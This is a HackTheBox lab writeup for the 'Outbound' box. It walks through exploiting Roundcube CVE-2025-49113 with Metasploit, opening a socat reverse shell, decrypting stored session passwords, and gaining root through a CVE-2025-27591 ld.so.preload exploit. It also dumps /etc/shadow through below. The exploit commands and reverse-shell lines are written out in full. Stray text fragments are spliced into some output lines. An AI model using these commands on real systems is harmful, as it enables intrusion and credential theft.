---
title: HackTheBox - Outbound writeup (Linux/Easy)
categories: [HackTheBox]
tags: [HackTheBox, Outbound, nmap, ssh, nginx, roundcube, CVE_2025_49113, msfconsole, metasploit, sliver, socat, php, config.inc.php, mysql, des, des_key, base64, below, CVE-2025-27591, cve_analysis, below-file-content-disclosure]
render_with_liquid: false
---

 `outbound` is an assume-breach easy `linux` box where I was given the credentials of `tyler`, I used his credentials to get a shell as `www-data` by exploiting `CVE_2025_49113`, an authenticated `RCE` in roundcube, when inside I decrypted rouncube session vars stored in mysql database to get jacob's credentials, then used my own exploit for `CVE-2025-27591` to get a root shell
## Recon

I ran `nmap` to find that the machine has ports 22 and 80 open
```bash
$ nmap -sCV -sS -oA outbound -vv 10.10.11.77
# Nmap 7.98 scan initiated Wed Nov 12 12:14:20 2025 as: nmap -sCV -sS -oA outbound -vv 10.10.11.77
Nmap scan report for 10.10.11.77
Host is up, received echo-reply ttl 63 (0.14s latency).
Scanned at 2025-11-12 12:14:21 +01 for 15s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

the `nginx` server on port 80 redirected to `mail.outbound.htb` so I added those entries to my hosts file
```bash
echo 10.10.11.77	htb outbound.htb mail.outbound.htb | sudo tee -a /etc/hosts
```

I visited `mail.outbound.htb` on my browser and was greeter with a `roundcube` instance

![roundcube_login.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/outbound/roundcube_login.png)
### initial credentials 

this is an assume-breach box, so Hackthebox provided the following credentials in the box information
> As is common in real life pentests, you will start the Outbound box with credentials for the following account `tyler / LhKL1o9Nm3X2`

## user.txt
### www-data

I logged in as `tyler` to find `roundcube` dashboard

![roundcube_dashboard.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/outbound/roundcube_dashboard.png)

I clicked on `about` on the bottom right to find the version of `roundcube` to be `Roundcube Webmail 1.6.10`

![roundcube_version.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/outbound/roundcube_version.png)

looking up that version I found that it's vulnerable to `CVE_2025_49113` which is an authenticated `RCE` vulnerability

I found an `metasploit` exploit that I used to get a reverse shell

```bash
$ msfconsole

[*] Starting persistent handler(s)...
msf > use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set host mail.outbound.htb
host => mail.outbound.htb
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set rhosts mail.outbound.htb
rhosts => outbound.htb
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set username tyler
username => tyler
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set password LhKL1o9Nm3X2
password => LhKL1o9Nm3X2
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set lhost tun0
lhost => 10.10.14.73
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
[*] Started reverse TCP handler on 10.10.14.73:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Extracted version: 10610
[+] The target appears to be vulnerable.
[*] Fetching CSRF token...
[+] Extracted token: ZLEpWuOBoG8kZk99GOkldcZ4ITHBR2g7
[*] Attempting login...
[+] Login successful.CVE-2025-27591
[*] Preparing payload...
[+] Payload successfully generated and serialized.
[*] Uploading malicious payload...
[+] Exploit attempt complete. Check for session.
[*] Sending stage (3090404 bytes) to 10.10.11.77
[*] Meterpreter session 1 opened (10.10.14.73:4444 -> 10.10.11.77:60520) at 2025-11-12 12:42:45 +0100

meterpreter >
```

I've also been getting into the habit of using `sliver C2` lately instead of `metasploit` of reverse shell, so at first I spent sometime trying to figure out how to deliver `sliver` beacon implant with this exploit by setting the payload to `payload/generic/custom` and giving it the path of the implant, but that didn't work for me, I also looked up at using stagers and delivering the implant as a second stage but after some time digging in `sliver` docs I found [this method](https://sliver.sh/tutorials?name=4+-+HTTP+Payload+staging) which is `intended for the 1.6 version of Sliver, which is not yet published` :(

after the previous method didn't work, I uploaded `socat` and got a stable reverse shell with it 
#### on the target machine
```bash
meterpreter > cd /tmp
meterpreter > upload /tmp/lab/socat
[*] Uploading  : /tmp/lab/socat -> socat
[*] Uploaded -1.00 B of 370.77 KiB (-0.0%): /tmp/lab/socat -> socat
[*] Completed  : /tmp/lab/socat -> socat
meterpreter > shell
Process 4358 created.
Channel 6 created.
ls -lh socat
-rw-r--r-- 1 www-data www-data 371K Nov 12 14:45 socat
chmod +x socat
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.73:10000
```

#### on my machine
```bash
$ socat file:`tty`,raw,echo=0 tcp-listen:10000
www-data@mail:/tmp$
```
### jacob

`www-data` had its home directory under `/var/html`, inside that directory I found a `config.inc.php`
```bash
www-data@mail:/tmp$ grep www-data /etc/passwd
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
www-data@mail:/tmp$ ls /var/www/
html
www-data@mail:/tmp$ ls /var/www/html/
index.nginx-debian.html  roundcube
www-data@mail:/tmp$ ls /var/www/html/roundcube/
CHANGELOG.md  SECURITY.md  composer.json  logs	       skins
INSTALL       SQL	   composer.lock  plugins      temp
LICENSE       UPGRADING    config	  program      vendor
README.md     bin	   index.php	  public_html
www-data@mail:/tmp$ ls /var/www/html/roundcube/config/
config.inc.php	config.inc.php.sample  defaults.inc.php  mimetypes.php
www-data@mail:/tmp
```

inside I found 2 passwords, one for the `mysql` database, and a `des_key` 

```bash
$ cat config.inc.php
...
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
...
// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

I connected to the `mysql` database, found a `users` table, but it had nothing interesting in it

```bash
ww-data@mail:~/html/roundcube$ mysql -u roundcube -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 9255
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use roundcubeCVE-2025-27591
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [roundcube]> show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)

MariaDB [roundcube]> select * from users
    -> ;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";} |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";} |L7Rv00A8TuwJAr67kITxxcSgnIk25Am
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-08-27 12:53:12 | 2025-06-11 07:51:22 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
3 rows in set (0.000 sec)

```

I checked the session table as it was mentioned in the `config.inc.php` file, and found called `vars` with `base64` data 

```bash
MariaDB [roundcube]> describe session;
+---------+--------------+------+-----+---------------------+-------+
| Field   | Type         | Null | Key | Default             | Extra |
+---------+--------------+------+-----+---------------------+-------+
| sess_id | varchar(128) | NO   | PRI | NULL                |       |
| changed | datetime     | NO   | MUL | 1000-01-01 00:00:00 |       |
| ip      | varchar(40)  | NO   |     | NULL                |       |
| vars    | mediumtext   | NO   |     | NULL                |       |
+---------+--------------+------+-----+---------------------+-------+
4 rows in set (0.001 sec)

MariaDB [roundcube]> select vars from session;
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------L7Rv00A8TuwJAr67kITxxcSgnIk25Am-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)
```

decoding the last one reveals that it belongs to `jacob` it also had an embedded password

```bash 
$ echo bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 | base64 -d
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"....
```

as mentioned earlier the `des_key` is used to decrypt this password, so I looked up how to decrypt `roundcube` session password and I found [this script](https://github.com/rafelsusanto/rcube-password-decryptor.git)
```bash
$ python rcube-decrypt.py
Paste base64 encrypted password (from session): L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
Paste 24-byte des_key (from config.inc.php): rcmail-!24ByteDESkey*Str
IV: 2fb46fd3403c4eec
Ciphertext: 0902bebb9084f1c5c4a09c8936e409bf
Unpadded (hex): 3539356d4f38446d77476544
Decrypted password (utf-8): 595mO8DmwGeD
Printable ASCII: 595mO8DmwGeD
```

the password worked with `su`
```bash
www-data@mail:~$ su jacob
Password:
jacob@mail:/var/www$ cat ~/user.txt
d0****************************39
```

## root.txt

inside `jacob`'s home directory, I found 2 mails, one with `jacob`'s ssh password, and another one saying that `jacob` was given access to the logs 

```bash
jacob@mail:~$ ls
mail
jacob@mail:~$ cd mail
jacob@mail:~/mail$ ls
INBOX  Trash
jacob@mail:~/mail$ cd INBOX/that I used to get a sane shell
jacob@mail:~/mail/INBOX$ ls
jacob
jacob@mail:~/mail/INBOX$ cat jacob
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status:
X-Keywords:
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>that I used to get a sane shell
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status:
X-Keywords:
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

the password worked with `ssh` login as `jacob`
```bash
$ nxc ssh outbound.htb -u jacob -p gY4Wr3a1evp4
SSH         10.10.11.77     22     outbound.htb     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12
SSH         10.10.11.77     22     outbound.htb     [+] jacob:gY4Wr3a1evp4  Linux - Shell access! 
```

after I logged in, I found that `jacob` can execute [below](https://github.com/facebookincubator/below) as root without a password, which is `A time traveling resource monitor for modern Linux systems`

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

I found that `below` is vulnerable to `CVE-2025-27591`
### a bit about CVE-2025-27591

> CVE-2025-27591 is a Local Privilege Escalation (LPE) vulnerability affecting `below`, a time-traveling resource monitor for Linux developed by Facebook Incubator. The issue stems from insecure permission handling during the initialization of log directories, where the application inadvertently creates world-writable directories and files. This flaw allows a local attacker—or a user with restricted `sudo` access—to execute a symlink attack, overwriting critical system files to gain root privileges

I've already made a CVE analysis (that'll be posted on [0x00sec](https://0x00sec.org) shortly) and made my own [stealthy PoC](https://github.com/0x00Jeff/CVE-2025-27591) that spawns a root reverse shell instead of modifying linux authentication files
### on my machine

i cloned the repo on my machine, compiled the c code
```bash
$ git clone git@github.com:0x00Jeff/CVE-2025-27591.git
$ cd CVE-2025-27591/
$ bash compile.sh
[+] compiling shared library
$ ls
compile.sh  exploit.sh  README.md  shared.c  shared.so
$ python -m http.server 10000
Serving HTTP on 0.0.0.0 port 10000 (http://0.0.0.0:10000/) ...
```

### on the target machine
dropped `shared.so` and `exploit.sh` to the machine and used them to get root
```bash
jacob@outbound:~$ wget http://10.10.15.93:10000/shared.so
jacob@outbound:~$ wget http://10.10.15.93:10000/exploit.sh
jacob@outbound:~$ ls
exploit.sh  shared.so  user.txt
jacob@outbound:~$ bash exploit.sh
[+] creating below directory structure
[+] creating malicious soft link
[+] copying shared library to /dev/shm
[+] triggering vulnerability
[+] exploit worked, writing library path into /etc/ld.so.preload
[+] setting up a listener, interactive reverse shell as root in a sec
Listening on 0.0.0.0 6969
Connection received on 127.0.0.1 37682
root
cat /root/root.txt
aa****************************29
```
# beyond root: leaking the hashed root password from /etc/shadow

while looking around for ways to exploit `below` I stumbled upon [this github issue](https://github.com/facebookincubator/below/issues/8254) which demonstrates how the `below` can be abused to read the initial part of files that a lower-privileged user normally cannot access, in another scenario where we can't pop a shell we can leak root's password hash and try to bruteforce it offline

```  bash
jacob@outbound:~$ sudo below replay --snapshot /etc/shadow --time now
Nov 22 12:57:33.117 ERRO
----------------- Detected unclean exit ---------------------
Error Message: failed to iterate over archive: numeric field was not a number: ::
sys:* when getting cksum for root:$y$j9T$pYysWAL0lX2oSXNpBeXs81$yinIBrOJnhJj7viI.GiorNEgZFyIewJbS3qnjgXth16:20247:0:99999:7:::
da
-------------------------------------------------------------
```

# beyond root: CVE-2025-27591 analysis

after I was done with this box, I took sometime to understand the root cause of `CVE-2025-27591` and explored different ways how it can be exploited, I've come up with [this PoC](https://github.com/0x00Jeff/CVE-2025-27591), as for the cve analysis, it I will be published soon on [0x00sec](https://0x00sec.org/) as a part of a forum reboot, keep an eye on the forum
